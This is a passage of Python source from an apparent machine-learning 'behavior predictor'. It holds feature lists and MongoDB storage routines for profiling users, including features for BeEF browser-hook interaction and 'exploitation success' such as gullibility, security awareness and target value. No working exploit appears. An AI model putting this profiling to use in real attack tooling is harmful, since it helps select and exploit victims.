                'trust_level', 'suspicion_level', 'curiosity_level', 'impulsiveness', 'risk_taking'
            ],
            BehaviorType.BEEF_INTERACTION: [
                'browser_version', 'javascript_enabled', 'cookies_enabled', 'local_storage_available', 'webgl_support',
                'popup_blocker', 'ad_blocker', 'script_blocker', 'tracking_protection', 'privacy_mode',
                'mouse_movements', 'keyboard_activity', 'scroll_behavior', 'click_patterns', 'focus_changes',
                'os_version', 'device_type', 'screen_resolution', 'network_type', 'connection_speed',
                'attention_level', 'distraction_level', 'curiosity_level', 'trust_level', 'suspicion_level'
            ],
            BehaviorType.EXPLOITATION_SUCCESS: [
                'vulnerability_score', 'security_awareness', 'tech_savvy', 'risk_tolerance', 'gullibility_score',
                'browser_vulnerabilities', 'os_vulnerabilities', 'plugin_vulnerabilities', 'network_vulnerabilities', 'device_vulnerabilities',
                'attack_complexity', 'social_engineering_level', 'technical_exploit_level', 'persistence_level', 'stealth_level',
                'time_pressure', 'distraction_level', 'stress_level', 'fatigue_level', 'cognitive_load',
                'previous_success_rate', 'similar_attack_success', 'target_value', 'attack_motivation', 'resource_availability'
            ],
            BehaviorType.SESSION_DURATION: [
                'user_age', 'user_experience', 'user_engagement', 'user_patience', 'user_curiosity',
                'content_quality', 'content_relevance', 'content_length', 'content_interactivity', 'content_novelty',
                'ui_quality', 'ui_complexity', 'ui_responsiveness', 'ui_accessibility', 'ui_aesthetics',
                'time_available', 'distraction_level', 'interruption_risk', 'urgency_level', 'motivation_level',
                'loading_speed', 'error_rate', 'compatibility_issues', 'network_stability', 'device_performance'
            ],
            BehaviorType.CONVERSION_LIKELIHOOD: [
                'intent_strength', 'need_level', 'urgency_level', 'motivation_level', 'commitment_level',
                'value_perception', 'benefit_clarity', 'cost_perception', 'risk_perception', 'trust_level',
                'social_proof', 'peer_influence', 'authority_endorsement', 'testimonial_quality', 'recommendation_strength',
                'process_complexity', 'time_required', 'effort_required', 'information_required', 'decision_complexity',
                'timing_appropriateness', 'environment_suitability', 'mood_state', 'stress_level', 'cognitive_load'
            ]
        }
        
        return feature_names.get(behavior_type, [])
    
    def _store_behavior_model(self, behavior_type: BehaviorType, prediction_horizon: PredictionHorizon, 
                            model, model_id: str):
        """Store trained behavior model"""
        try:
            if self.mongodb:
                collection = self.mongodb.behavior_models
                doc = {
                    'model_id': model_id,
                    'behavior_type': behavior_type.value,
                    'prediction_horizon': prediction_horizon.value,
                    'model_data': pickle.dumps(model),
                    'scaler_data': pickle.dumps(self.scalers[behavior_type]),
                    'created_at': datetime.now(timezone.utc),
                    'last_trained': datetime.now(timezone.utc)
                }
                collection.insert_one(doc)
                
        except Exception as e:
            logger.error(f"Error storing behavior model: {e}")
    
    def _store_behavior_prediction(self, prediction: BehaviorPrediction):
        """Store behavior prediction"""
        try:
            if self.mongodb:
                collection = self.mongodb.behavior_predictions
                doc = asdict(prediction)
                doc["timestamp"] = prediction.timestamp
                collection.insert_one(doc)
                
        except Exception as e:
            logger.error(f"Error storing behavior prediction: {e}")
    
    def _store_behavior_pattern(self, pattern: BehaviorPattern):
        """Store behavior pattern"""
        try:
            if self.mongodb:
                collection = self.mongodb.behavior_patterns
                doc = asdict(pattern)
                doc["created_at"] = pattern.created_at
                doc["last_seen"] = pattern.last_seen
                collection.insert_one(doc)
                
        except Exception as e:
            logger.error(f"Error storing behavior pattern: {e}")

# Global behavior predictor instance
behavior_predictor = None

def initialize_behavior_predictor(mongodb_connection=None, redis_client=None) -> BehaviorPredictor:
    """Initialize behavior predictor"""
    global behavior_predictor
    behavior_predictor = BehaviorPredictor(mongodb_connection, redis_client)
    return behavior_predictor

def get_behavior_predictor() -> BehaviorPredictor:
    """Get behavior predictor instance"""
    global behavior_predictor
    if behavior_predictor is None:
        behavior_predictor = BehaviorPredictor()
    return behavior_predictor
